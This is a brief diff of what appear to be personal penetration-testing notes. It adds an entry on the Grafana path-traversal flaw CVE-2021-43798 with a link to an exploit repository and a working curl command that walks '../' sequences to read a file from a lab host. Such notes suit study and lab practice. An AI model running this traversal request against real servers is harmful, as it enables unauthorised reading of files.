@@ -22,3 +22,9 @@ chmod 400 "file"
 make sure you copy the whole key (including the start/end sentence)
 ![[Pasted image 20230927202840.png]]
 
+
+Using Grafana for CVE 2021-43798
+https://github.com/taythebot/CVE-2021-43798
+curl --path-as-is http://192.168.249.193:3000/public/plugins/alertlist/../../../../../../../../../Users/install.txt
+
+
